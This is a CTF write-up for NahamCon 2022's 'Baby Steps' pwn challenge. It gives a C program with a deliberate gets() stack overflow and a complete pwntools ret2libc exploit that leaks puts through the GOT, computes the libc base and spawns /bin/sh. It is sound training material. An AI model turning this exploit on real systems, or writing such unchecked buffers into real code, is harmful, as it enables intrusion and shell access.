---
name: Baby Steps (2022)
event: NahamCon CTF 2022
category: Pwn
description: Writeup for Baby Steps (Pwn) - NahamCon CTF (2022) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Baby Steps

## Description

> Become a baby! Take your first steps and jump around with BABY SIMULATOR 9000!

## Source

{% code overflow="wrap" %}
```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>


#define BABYBUFFER 16

void setup(void) {
    setbuf(stdout, NULL);
    setbuf(stdin, NULL);
}

void whine() {
  puts("You whine: 'WAAAAAAHHHH!! WAAH, WAAHH, WAAAAAAHHHH'\n");
}

void scream() {
  puts("You scream: 'WAAAAAAHHHH!! WAAH, WAAHH, WAAAAAAHHHH'\n");
}

void cry() {
  puts("You cry: 'WAAAAAAHHHH!! WAAH, WAAHH, WAAAAAAHHHH'\n");
}

void sleep() {
  puts("Night night, baby!\n");
  exit(-1);
}


void ask_baby_name() {
  char buffer[BABYBUFFER];
  puts("First, what is your baby name?");
  return gets(buffer);
}

int main(int argc, char **argv){
  setup();

  puts("              _)_");
  puts("           .-'(/ '-.");
  puts("          /    `    \\");
  puts("         /  -     -  \\");
  puts("        (`  a     a  `)");
  puts("         \\     ^     /");
  puts("          '. '---' .'");
  puts("          .-`'---'`-.");
  puts("         /           \\");
  puts("        /  / '   ' \\  \\");
  puts("      _/  /|       |\\  \\_");
  puts("     `/|\\` |+++++++|`/|\\`");
  puts("          /\\       /\\");
  puts("          | `-._.-` |");
  puts("          \\   / \\   /");
  puts("          |_ |   | _|");
  puts("          | _|   |_ |");
  puts("          (ooO   Ooo)");
  puts("");

  puts("=== BABY SIMULATOR 9000 ===");

  puts("How's it going, babies!!");
  puts("Are you ready for the adventure of a lifetime? (literally?)");
  puts("");
  ask_baby_name();

  puts("Pefect! Now let's get to being a baby!\n");

  char menu_option;

  do{

    puts("CHOOSE A BABY ACTIVITY");
    puts("a. Whine");
    puts("b. Cry");
    puts("c. Scream");
    puts("d. Throw a temper tantrum");
    puts("e. Sleep.");
    scanf(" %c",&menu_option);

    switch(menu_option){

      case 'a':
        whine();
        break;
      case 'b':
        cry();
        break;
      case 'c':
        scream();
        break;
      case 'd':
        scream();
        cry();
        whine();
        cry();
        scream();
        break;
      case 'e':
        sleep();
        break;

      default:
        puts("WAAAAAAHHHH, THAT NO-NO!!!\n");
        break;
    }

  }while(menu_option !='e');

}
```
{% endcode %}

## Solution

{% code overflow="wrap" %}
```py
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Find offset to EIP/RIP for buffer overflows
def find_ip(payload):
    # Launch process and send payload
    p = process(exe, level='warn')
    p.sendlineafter(b'?', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    ip_offset = cyclic_find(p.corefile.pc)  # x86
    # ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    warn('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset

# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Binary filename
exe = './babysteps'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
libc = ELF("./libc6-i386_2.35-0ubuntu3_amd64.so")

# Pass in pattern_size, get back EIP/RIP offset
offset = find_ip(cyclic(500))

# Start program
io = start()

# Payload to leak libc function
payload = flat({
    offset: [
        elf.plt.puts,  # Call puts(x)
        elf.symbols.ask_baby_name,  # Return here
        elf.got.puts  # x = Leak got.puts
    ]
})

# Send the payload
io.sendlineafter(b'what is your baby name?', payload)

io.recvline()  # Receive the newline

# Retrieve got.puts address
got_puts = unpack(io.recv()[:4].ljust(4, b"\x00"))
info("leaked got_puts: %#x", got_puts)

# Subtract puts offset to get libc base
libc.address = got_puts - libc.symbols.puts
info("libc_base: %#x", libc.address)

# System(/bin/sh)
info("system_addr: %#x", libc.symbols.system)
bin_sh = next(libc.search(b'/bin/sh\x00'))
info("bin_sh: %#x", bin_sh)

# Payload to get shell
payload = flat({
    offset: [
        libc.symbols.system,  # system(x)
        0x0,  # return
        bin_sh  # x = "/bin/sh"
    ]
})

# Send the payload
io.sendline(payload)

# Got Shell?
io.interactive()
```
{% endcode %}
